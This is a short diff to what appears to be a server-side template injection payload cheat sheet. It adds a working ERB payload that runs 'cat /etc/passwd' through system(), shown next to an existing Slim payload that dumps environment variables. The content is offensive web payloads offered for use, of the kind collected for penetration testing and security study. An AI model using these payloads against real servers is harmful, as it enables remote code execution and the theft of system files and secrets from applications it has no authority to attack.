@@ -97,6 +97,12 @@ Execute code using SSTI for Slim engine.
 #{ %x|env| }
 ```
 
+Execute code using SSTI for ERB engine.
+
+```ruby
+<%= system('cat /etc/passwd') %>
+```
+
 ## Java
 
 ### Basic injection
